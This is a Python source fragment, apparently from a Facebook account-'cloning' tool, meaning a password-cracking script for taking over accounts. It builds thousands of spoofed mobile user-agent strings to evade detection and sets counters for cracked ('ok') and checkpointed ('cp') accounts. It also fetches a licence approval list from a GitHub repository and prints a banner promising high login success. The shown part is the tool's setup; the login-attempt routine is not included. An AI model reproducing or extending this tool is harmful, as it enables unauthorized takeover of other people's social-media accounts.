ua = ["Mozilla/5.0 (Linux; Android 12; Infinix X6827 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 12; Infinix X676B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/434.0.0.36.115",]
ua = ["Mozilla/5.0 (Linux; Android 13; V2172A Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113",]
ua = ["Mozilla/5.0 (Linux; Android 10; V2002A Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.65 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/401.0.0.24.77",]
ua = ["Mozilla/5.0 (Linux; Android 11; I2012 Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/432.0.0.29.102",]
ua = ["Mozilla/5.0 (Linux; Android 11; RMX3121 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/434.0.0.36.115",]
ua = ["Mozilla/5.0 (Linux; Android 12;CPH2365 Build/RKQ1.211119.001; wv)AppleWebKit/537.36 (KHTML, like Gecko)Version/4.0 Chrome/103.0.5060.129Mobile Safari/537.36 [FB_IAB/OrcaAndroid;FBAV/372.0.0.10.112;",]
ua = ["Mozilla/5.0 (Linux; U; Android 10;Device HUAWEI Mate 20 lite)AppleWebkit/534.30 (KHTML, likeGecko) Version/4.0 Mobile Safari534.30 Spotify/860200774 (6; 2; 7)",]
ua = ["Mozilla/5.0 (Linux; Android 7.1.2; Redmi 5A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.364.",]
ua = ["Mozilla/5.0 (Linux; Android 9; itel L5503 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/79.0.3945.116 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/320.0.0.12.108;",]
ua = ["Mozilla/5.0 (Linux; Android 11; RMX3511 Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.4606.85 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/369.0.0.18.103;",]
ua = ["Mozilla/5.0 (Linux; Android 10; SM-M215F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; U; Android 12; en-US; TECNO KI5k Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 UCBrowser/13.5.5.1313 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 10; Z30 pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 9; Infinix X604) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4652.156 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 8.1.0; LH9810) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36,gzip(gfe)",]
ua = ["Mozilla/5.0 (Linux; Android 13; SM-S901B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 7.1.2; Redmi Note 5A Prime Build/N2G47H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Mobile Safari/537.36 YaApp_Android/10.61 YaSearchBrowser/10.61",]
ua = ["Mozilla/5.0 (Linux; Android 10; REALME RMX1911 Build/NMF26F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36 AlohaBrowser/2.20.3",]
ua = ["Mozilla/5.0 (Linux; Android 12; RMX3371 Build/RKQ1.211119.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/118.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/438.0.0.33.118;",]
ua = ["Mozilla/5.0 (Linux; Android 11; RMX3506 Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/97.0.4692.98 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/436.0.0.35.101;",]
ua = ["Mozilla/5.0 (Linux; Android 13; RMX3760 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/438.0.0.33.118;",]
ua = ["Mozilla/5.0 (Linux; Android 13; RMX3311 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/436.0.0.35.101;",]
ua = ["Mozilla/5.0 (Linux; Android 13; SM-A037U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 10; SAMSUNG SM-N960F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/21.0 Chrome/110.0.5481.154 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 13; 23030RAC7Y Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/118.0.0.0 Mobile Safari/537.36[FBAN/EMA;FBLC/es_ES;FBAV/378.0.0.12.118;",]
ua = ["Mozilla/5.0 (Linux; Android 13; 2210129SG Build/TKQ1.220829.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/118.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/438.0.0.34.118;",]
ua = ["Mozilla/5.0 (Linux; Android 11; 2209116AG Build/RKQ1.200826.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/435.0.0.42.112;",]
ua = ["Mozilla/5.0 (Linux; Android 13; 2210129SG Build/TKQ1.220829.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/436.0.0.35.101;",]
ugen=[]
cokbrut=[]
ses=requests.Session()
prinCP=[]
for xd in range(1000):
    a='Mozilla/5.0 (Symbian/3; Series60/'
    b=random.randrange(1, 9)
    c=random.randrange(1, 9)
    d='SamsungBrowser'
    e=random.randrange(100, 9999)
    f='NEO-AL00 Build/HUAWEINEO-AL00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    g=random.randrange(1, 9)
    h=random.randrange(1, 4)
    i=random.randrange(1, 4)
    j=random.randrange(1, 4)
    k='Mobile Safari/537.36'
    uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
    ugen.append(uaku)
for xd in range(1000):
    a='Mozilla/5.0 (Symbian/3; Series60/5.2'
    b=random.randrange(1, 9)
    c=random.randrange(1, 9)
    d='NokiaN8-00/012.002;'
    e=random.randrange(100, 9999)
    f='Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/533.4 (KHTML, like Gecko) NokiaBrowser/'
    g=random.randrange(1, 9)
    h=random.randrange(1, 4)
    i=random.randrange(1, 4)
    j=random.randrange(1, 4)
    k='7.3.0 Mobile Safari/533.4 3gpp-gba'
    uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
    ugen.append(uaku)

for xd in range(1000):
	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['7.1.1','6.0.1','9','10','11','12','13','14'])
	c=random.choice(['SM-J510F','SM-J510G','SM-J510FN','SM-J510Y','SM-J510M','SM-J510GN','SM-J510H','SM-J510MN','SM-J5108','SM-J510UN','SM-J510L','SM-J510S','SM-J510FQ','SM-J510K'])
	d=random.choice(['Build/NMF26X','Build/MMB29M','Build/PQ3B.190801.002'])
	e='wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	f=random.randrange(40,115)
	g='0'
	h=random.randrange(3000,6000)
	i=random.randrange(20,100)
	j='Mobile Safari/537.36'
	fahim=(f"{a} {b}; {c} {d}; {e}{f}.{g}.{h}.{i} {j}")
	ugen.append(fahim)
for xd in range(1000):
	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['7.1.1','5.1.1','6.0.1','9','10','11','12','13','14'])
	c=random.choice(['SM-J120F','SM-J120H','SM-J120M','SM-J120M','SM-J120T','SM-J120G','SM-J120A','SM-J120FN','SM-J120AZ','SM-J120ZN','SM-J120W'])
	d=random.choice(['Build/LMY47V','Build/LMY47X','Build/NMF26F'])
	e='wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	f=random.randrange(40,115)
	g='0'
	h=random.randrange(3000,6000)
	i=random.randrange(20,100)
	j='Mobile Safari/537.36'
	op=(f"{a} {b}; {c} {d}; {e}{f}.{g}.{h}.{i} {j}")
	ugen.append(op)
for xd in range(1000):
	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['8.1.0','7.0','6.0.1','9','10','11','12','13','14'])
	c=random.choice(['SM-G610F','SM-G610Y','SM-G610M','SM-G610'])
	d=random.choice(['Build/NRD90M','MMB29K','Build/M1AJQ'])
	e='wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	f=random.randrange(40,115)
	g='0'
	h=random.randrange(3000,6000)
	i=random.randrange(20,100)
	j='Mobile Safari/537.36'
	fah=(f"{a} {b}; {c} {d}; {e}{f}.{g}.{h}.{i} {j}")
	ugen.append(fah)
for i in range(1000):
	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12','13','14'])
	c=random.choice(['SM-A716F','SM-A716F/DS','SM-A716F/DSN','SM-A7160','SM-A716B/DS','SM-A716U','SM-A716B','SM-A716U1'])
	d=random.choice(['Build/TP1A.220624.014','Build/SP1A.210812.016','Build/RP1A.200720.012','Build/QP1A.190711.020'])
	e='wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	f=random.randrange(40,115)
	g='0'
	h=random.randrange(3000,6000)
	i=random.randrange(20,100)
	j='Mobile Safari/537.36'
	fa=(f"{a} {b}; {c} {d}; {e}{f}.{g}.{h}.{i} {j}")
	ugen.append(fa)
for xd in range(1000):
    a='Mozilla/5.0 (Symbian/3; Series60/5.2'
    b=random.randrange(1, 9)
    c=random.randrange(1, 9)
    d='NokiaN8-00/012.002;'
    e=random.randrange(100, 9999)
    f='Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/533.4 (KHTML, like Gecko) NokiaBrowser/'
    g=random.randrange(1, 9)
    h=random.randrange(1, 4)
    i=random.randrange(1, 4)
    j=random.randrange(1, 4)
    k='7.3.0 Mobile Safari/533.4 3gpp-gba'
    uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
    ugen.append(uaku) 
for i in range(2000):
    aa='Mozilla/5.0 (Linux; Android'
    b=random.choice(['6','7','8','9','10','11','12'])
    c='Redmi 6A Build/N2G47H)'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
    rr = random.randint
    rc = random.choice
    satu = f"Mozilla/5.0 (Linux; Android {str(rr(211111,299999))}; CPH2457) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/ {str(rr(73,99))}.0.{str(rr(4500,4900))}.{str(rr(75,150))} Mobile Safari/537.36"
    dua  = f"Mozilla/5.0 (Linux; Android {str(rr(7,12))}; Infinix X671) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/ {str(rr(75,150))}.0.{str(rr(5111,5999))}.{str(rr(73,99))} Mobile Safari/537.36"
    tiga  = f"Mozilla/5.0 (Linux; Android {str(rr(111111,199999))}; 4188S Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) {str(rr(73,99))}.0.{str(rr(4500,4900))}.{str(rr(75,150))} Version/4.0 Chrome/ {str(rr(2111111,2999999))} Mobile Safari/537.36"
    empat  = f"Mozilla/5.0 (Linux; Android {str(rr(7,12))}; Moto X40 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/ {str(rr(75,150))}.0.{str(rr(5111,5999))}.{str(rr(73,99))} Mobile Safari/537.36"
    uaku2 = str(rc([satu,dua,tiga,empat]))
    ugen.append(uaku2)
for agenku in range(10000):
  a='Mozilla/5.0 (Linux; Android'
  b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
  c=random.choice(['M2006C3MII'])
  d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
  e=random.randrange(1, 999)
  f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
  g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
  h=random.randrange(80,103)
  i='0'
  j=random.randrange(4200,4900)
  k=random.randrange(40,150)
  l='Mobile Safari/537.36'
  uakuh=f'{a} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
  ugen.append(uakuh)
  
  a='Mozilla/5.0 (Linux; Android'
  b=random.choice(['8.1.0','9','10','11','12','13'])
  c='Redmi Note 9 Pro Build/QKQ1.191215.002; wv)'
  d='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
  e=random.randrange(73,100)
  f='0'
  g=random.randrange(4200,4900)
  h=random.randrange(40,150)
  i='Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/399.0.0.24.93;]'
  uakuh=f'{a} {b}; {c} {d}{e}.{f}.{g}.{h} {i}'
  ugen.append(uakuh)

  aa='Mozilla/5.0 (Linux; U; Android'
  b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
  c=random.choice(['801SO'])
  d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
  e=random.randrange(1, 999)
  f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
  g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
  h=random.randrange(80,103)
  i='0'
  j=random.randrange(4200,4900)
  k=random.randrange(40,150)
  l='Mobile Safari/537.36 OPR/63.0.2254.62069'
  uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
  ugen.append(uakuh)
  
  a='Mozilla/5.0 (Linux; Android'
  b=random.choice(['8.1.0','9','10','11','12','13'])
  c='SM-G960N Build/QP1A.190711.020; wv)'
  d='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
  e=random.randrange(73,100)
  f='0'
  g=random.randrange(4200,4900)
  h=random.randrange(40,150)
  i='Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/399.0.0.24.93;]'
  uakuh=f'{a} {b}; {c} {d}{e}.{f}.{g}.{h} {i}'
  ugen.append(uakuh)

  aa='Mozilla/5.0 (Linux; Android'
  b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
  c=random.choice(['SM-J610F'])
  d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
  e=random.randrange(80,106)
  f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
  g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
  h=random.randrange(80,103)
  i='0'
  j=random.randrange(4200,4900)
  k=random.randrange(40,150)
  l='Mobile Safari/537.36'
  uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
  ugen.append(uakuh)
  
  aa='Mozilla/5.0 (Linux; U; Android'
  b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
  c=random.choice(['LE2113'])
  d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
  e=random.randrange(1, 999)
  f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
  g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
  h=random.randrange(80,103)
  i='0'
  j=random.randrange(4200,4900)
  k=random.randrange(40,150)
  l='Mobile Safari/537.36'
  uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
  ugen.append(uakuh)

  aa='Mozilla/5.0 (Linux; U; Android'
  b=random.choice(['6','7','8','9','10','11','12'])
  c=(['en-us; RMX1925 Build/QKQ1.200209.002)'])
  d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
  e=random.randrange(1, 999)
  f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
  g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
  h=random.randrange(73,100)
  i='0'
  j=random.randrange(4200,4900)
  k=random.randrange(40,150)
  l='Mobile Safari/537.36 HeyTapBrowser/45.7.0.0'
  uakuh=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
  ugen.append(uakuh)
  
  aa='Mozilla/5.0 (Linux; U; Android'
  b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
  c=random.choice(['M2012K11C'])
  d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
  e=random.randrange(1, 999)
  f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
  g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
  h=random.randrange(80,103)
  i='0'
  j=random.randrange(4200,4900)
  k=random.randrange(40,150)
  l='Mobile Safari/537.36 OPR/51.4.5237.26623'
  uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
  ugen.append(uakuh)
  
  aa='Mozilla/5.0 (Linux; U; Android'
  b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
  c=random.choice(['vivo 1002T'])
  d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
  e=random.randrange(1, 999)
  f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
  g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
  h=random.randrange(80,103)
  i='0'
  j=random.randrange(4200,4900)
  k=random.randrange(40,150)
  l='Mobile Safari/537.36'
  uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
  ugen.append(uakuh)
  
  aa='Mozilla/5.0 (Linux; U; Android'
  b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
  c=random.choice(['CPH2083'])
  d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
  e=random.randrange(1, 999)
  f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
  g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
  h=random.randrange(80,103)
  i='0'
  j=random.randrange(4200,4900)
  k=random.randrange(40,150)
  l='Mobile Safari/537.36 GoogleApp/13.44.10.26.arm64'
  uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
  ugen.append(uakuh)

for xd in range(1000):
    a='Mozilla/5.0 (Linux; Android'
    b=random.choice(['4','5','6','7','8','9','10','11','12','13','14','15','16'])
    c='RMX3191 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome'
    d=random.randrange(10,200)
    e='0.4844.88 '
    f=random.randrange(1000,8000)
    g=random.randrange(10,200)
    h='Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/383.1.0.25.106;]'
    uaku2=(f'{a} {b};{c}{d}.{e}.{f}.{g} {h}')
    ugen.append(uaku2)
    
for xd in range(1000):
    a='Mozilla/5.0 (Linux; Android'
    b=random.choice(['4','5','6','7','8','9','10','11','12','13','14','15','16'])
    c='CPH2269 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    d=random.randrange(10,200)
    e='0'
    f=random.randrange(1000,8000)
    g=random.randrange(10,200)
    h='Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/348.0.0.8.103;]'
    uaku2=(f'{a} {b};{c}{d}.{e}.{f}.{g} {h}')
    ugen.append(uaku2)

for agent in range(1000):
        aa='Mozilla/5.0 (Linux; Android 6.0.1;'
        b=random.choice(['6','7','8','9','10','11','12'])
        c='en-us; 10; T-Mobile myTouch 3G Slide Build/'
        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        e=random.randrange(1, 999)
        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.99'
        h=random.randrange(73,100)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Mobile Safari/533.1'
        fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
        ugen.append(fullagnt)
def uaku():
	try:
		ua=open('bbnew.txt','r').read().splitlines()
		for ub in ua:
			ugen.append(ub)
	except:
		a=requests.get('https://github.com/BlackFF444/Api/blob/main/bbnew.txt').text
		ua=open('.bbnew.txt','w')
		aa=re.findall('line">(.*?)<',str(a))
		for un in aa:
			ua.write(un+'\n')
		ua=open('.bbnew.txt','r').read().splitlines()


#------------[ INDICATION ]---------------#
id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]
pwpluss,pwnya=[],[]
#------------[ HEART- ]--------------#
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[38;5;50m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,h,u,b])
 
###----------[ ANSII COLOR STYLE ]---------- ###
 
Z = "\x1b[0;90m"     # Hitam
M = "\x1b[38;5;196m" # Merah
H = "\x1b[38;5;46m"  # Hijau
K = "\x1b[38;5;226m" # Kuning
B = "\x1b[38;5;44m"  # Biru
U = "\x1b[0;95m"     # Ungu
O = "\x1b[0;96m"     # Biru Muda
P = "\x1b[38;5;231m" # Putih
J = "\x1b[38;5;208m" # Jingga
A = "\x1b[38;5;248m" # Abu-Abu
 
###----------[ RICH COLOR STYLE ]---------- ###
 
Z2 = "[#000000]" # Hitam
M2 = "[#FF0000]" # Merah
H2 = "[#00FF00]" # Hijau
K2 = "[#FFFF00]" # Kuning
B2 = "[#00C8FF]" # Biru
U2 = "[#AF00FF]" # Ungu
N2 = "[#FF00FF]" # Pink
O2 = "[#00FFFF]" # Biru Muda
P2 = "[#FFFFFF]" # Putih
J2 = "[#FF8F00]" # Jingga
A2 = "[#AAAAAA]" # Abu-Abu
 
#--------------------[ CONVERTER-BULAN ]--------------#
 
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
date = str(tgl)+'/'+str(bln)+'/'+str(thn)
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"
    def alvino_xy(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)
def TUTULj(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.01)
def clear():
	os.system('clear')
def alvino_xy(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)
def clear():
    os.system('clear')
def back():
    login()
def linex():
    print('\033[1;37m')
def animation(u):
    for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.01)
logo ="""
\x1b[38;5;46m════════════════════════════════════════════════
\x1b[38;5;46m.########..##..........###.....######..##....##
\x1b[38;5;46m.##.....##.##.........##.##...##....##.##...##.
\x1b[38;5;46m.##.....##.##........##...##..##.......##..##..
\x1b[38;5;46m.########..##.......##.....##.##.......#####...
\x1b[38;5;46m.##.....##.##.......#########.##.......##..##..
\x1b[38;5;46m.##.....##.##.......##.....##.##....##.##...##.
\x1b[38;5;46m.########..########.##.....##..######..##....##
\x1b[38;5;46m════════════════════════════════════════════════
"""
def meyexudi():
  os.system('clear')
  uuid = str(os.geteuid()) + str(os.getlogin())
  id = "-".join(uuid)
  try:
    httpCaht = requests.get('https://github.com/BlackFF444/Api/blob/main/Approval.txt').text
    if id in httpCaht:
      msg = str(os.geteuid())
      pass
    else:
      print(' \x1b[38;5;208m╔══[√]💥  FREE-FIRE-TIK-TOK- ID CLONING')      
      print(' \x1b[1;98m║══[√]💥  ONLY ACTIVE ID CLONE 100%')
      print(' \x1b[1;93m║══[√]💥  CP ID WILL BE LOGIN 80%')
